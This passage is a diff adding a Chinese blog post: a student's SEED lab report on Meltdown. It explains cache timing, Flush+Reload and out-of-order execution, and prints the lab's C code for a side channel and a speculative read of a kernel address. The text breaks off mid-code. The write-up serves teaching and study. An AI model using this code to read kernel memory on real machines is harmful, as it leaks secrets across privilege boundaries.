@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="大名鼎鼎的meltdown和specture，第一次学竟然还是在学校。关于这两个实验的seedlab报告">
+<meta property="og:type" content="article">
+<meta property="og:title" content="software-security-lab2">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/04/07/software-security-lab2/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="大名鼎鼎的meltdown和specture，第一次学竟然还是在学校。关于这两个实验的seedlab报告">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407164214574.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407164653089.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407173537677.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407181959568.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407182828460.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//%E5%9B%BE%E7%89%87.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407184341064.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407184628762.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407192830144.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407193851723.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407203844688.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220421145721129.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407205703737.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407213402700.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407213819615.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407214922124.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220407222031706.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409151911045.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409152120795.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409152613890.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409153717215.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409153826120.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409155633226.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409155924727.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220409163052620.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220420201036926.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220414153807373.png">
+<meta property="article:published_time" content="2022-04-07T08:38:21.000Z">
+<meta property="article:modified_time" content="2022-04-25T09:17:26.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="meltdown">
+<meta property="article:tag" content="software-security">
+<meta property="article:tag" content="hardware">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220407164214574.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>software-security-lab2 | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-software-security-lab2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/07/software-security-lab2/" class="article-date">
+      <time datetime="2022-04-07T08:38:21.000Z" itemprop="datePublished">2022-04-07</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      software-security-lab2
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/school/">school</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>大名鼎鼎的meltdown和specture，第一次学竟然还是在学校。<br>关于这两个实验的seedlab报告</p>
+<span id="more"></span>
+
+<h1 id="meltdown"><a href="#meltdown" class="headerlink" title="meltdown"></a>meltdown</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p>当事先填充array[3]和array[7]的时候，可以看到访问速度明显加快了。</p>
+<p><img src="/.io//image-20220407164214574.png" alt="image-20220407164214574"></p>
+<p><img src="/.io//image-20220407164653089.png" alt="image-20220407164653089"></p>
+<p>这些被提前加载到CPU cache中，导致访问时时间减少。</p>
+<h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>第二部分使用<code>side attack</code>尝试恢复出访问较快的值。可以看到程序开头设置了一个<code>threshold</code>用来标识访问时间小于多少的时候算是访问了已经cache的数组。</p>
+<p>关键代码如下。这里我们遍历数组，并获得访问每个数组之间的cpu line数目</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从之前可以看到存在着一些访问时间会小于这里初始设置的threshold小于80。于是我们就获得了结果。</p>
+<p><img src="/.io//image-20220407173537677.png" alt="image-20220407173537677"></p>
+<p>但是注意可能要多尝试几次才能成功。</p>
+<h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p>这里作者实现了一个内核模块。这个内核模块首先打印出<code>secret_data</code>地址，接着用户可以通过这个模块定义的一个module和他交互，使得这个模块把一个<code>secret_data</code>读入内存。我们要做的就是把这个<code>secret data</code>读出。</p>
+<p><img src="/.io//image-20220407181959568.png" alt="image-20220407181959568"></p>
+<p>那么task3的目的就是获得这句输出。</p>
+<h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>task4想让我们做到直接尝试访问内核中的数据。如果不通过<code>meltdown</code>显然是不行的。下面是一个简单的测试。如果我们想通过printf告知我们已经读成功了，那么需要经过很长一系列库函数调用。在这段时间内CPU早就发现了我们已经越界访问，所以不可能成功读出数据。</p>
+<p><img src="/.io//image-20220407182828460.png" alt="image-20220407182828460"></p>
+<p>设计的源代码如下，和文档中给出的一样。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *kernel_data_addr = (<span class="type">char</span>*)<span class="number">0xf90a3000</span>;</span><br><span class="line"><span class="type">char</span> kernel_data = *kernel_data_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I have reached here.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>由于C没有原生的try…catch函数，我们需要使用<code>sigjmp</code>完成跳转。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Roll back to the checkpoint set by sigsetjmp().</span></span><br><span class="line">  siglongjmp(jbuf, <span class="number">1</span>);                         </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">// The address of our secret data</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr = <span class="number">0xfb61b000</span>;</span><br><span class="line">  <span class="comment">// Register a signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);                     </span><br><span class="line">  <span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123;                </span><br><span class="line">     <span class="comment">// A SIGSEGV signal will be raised. </span></span><br><span class="line">     <span class="type">char</span> kernel_data = *(<span class="type">char</span>*)kernel_data_addr; </span><br><span class="line">     <span class="comment">// The following statement will not be executed.</span></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Kernel data at address %lu is: %c\n&quot;</span>, </span><br><span class="line">                    kernel_data_addr, kernel_data);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Memory access violation!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Program continues to execute.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面借助lab对上面代码理解。</p>
+<ol>
+<li>在main第二行我们创建了一个segmentation fault的handler。这个handler设置段错误的处理函数为我们自定义的<code>catch_segv</code>。</li>
+<li>接着看<code>catch_segv</code>。这是一个长跳转，让我们直接跳转到第17行保存的sigsetjump位置。同时当17行设置buf的时候，这个函数返回0，这导致我们通过17行的if判断。</li>
+<li>在这个判断里面我们尝试访问内核数据。这将导致一个段错误，于是被handler捕获。</li>
+<li>捕获之后我们调用handler中自己设计的<code>siglongjmp(jbuf, 1);</code>跳转到17行，同时返回1.</li>
+<li>返回的1让17行判断不通过，进入else部分。输出一段话：发生了越界访问。</li>
+</ol>
+<p><img src="/.io//%E5%9B%BE%E7%89%87.png" alt="图片"></p>
+<p>运行程序，发现我们在段错误之后依然可以执行。</p>
+<p><img src="/.io//image-20220407184341064.png" alt="image-20220407184341064"></p>
+<h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><p>task6介绍了CPU乱序执行。用以下代码举例。</p>
+<p><img src="/.io//image-20220407184628762.png" alt="image-20220407184628762"></p>
+<p>这其实在上课也讲过了，就是我们读取虽然会报错，但是CPU乱序执行下，第三条和第四条的汇编指令其实上是被读取到CPU_cache中的。</p>
+<p><img src="/.io//image-20220407192830144.png" alt="image-20220407192830144"></p>
+<p>在这个lab中我们用下面的代码观察乱序执行。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>,i);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">  kernel_data = *(<span class="type">char</span>*)kernel_data_addr;     </span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span> * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;          </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span>                